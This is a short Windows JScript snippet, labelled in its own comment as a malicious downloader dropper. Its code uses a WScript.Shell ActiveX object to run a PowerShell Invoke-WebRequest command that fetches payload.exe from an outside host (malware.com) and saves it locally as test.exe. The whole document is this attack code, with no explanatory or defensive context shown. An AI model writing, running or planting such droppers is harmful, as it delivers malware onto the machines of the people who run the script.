// Malicious JS downloader dropper
var ws = new ActiveXObject("WScript.Shell");
ws.Run("powershell -c Invoke-WebRequest -Uri http://malware.com/payload.exe -OutFile test.exe");
